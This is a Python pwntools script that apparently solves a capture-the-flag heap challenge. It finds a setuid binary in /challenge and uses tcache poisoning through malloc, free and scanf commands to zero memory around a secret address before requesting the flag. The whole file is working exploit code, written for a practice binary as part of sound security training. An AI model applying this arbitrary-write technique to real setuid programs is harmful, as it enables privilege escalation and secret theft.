# Seeking Substantial Secrets
import sys

import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    import os
    import stat
    from pathlib import Path

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def one_round(io: pwn.process):
    tee(io)
    addr = 0x426966

    def clean_qword(addr):
        io.sendline(b"malloc 0 16")
        io.sendline(b"malloc 1 16")
        io.sendline(b"free 0")
        io.sendline(b"free 1")
        io.sendline(b"scanf 1")
        io.sendline((addr - 0x8).to_bytes(4, "little"))
        io.sendline(b"malloc 0 16")
        io.sendline(b"malloc 0 16")

    clean_qword(addr + 0x0C)
    clean_qword(addr + 0x04)
    clean_qword(addr - 0x04)

    io.sendline(b"send_flag")
    io.sendline(b"\0" * 16)
    io.sendline(b"quit")
    io.recvrepeat()


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        one_round(io)


if __name__ == "__main__":
    ctf()
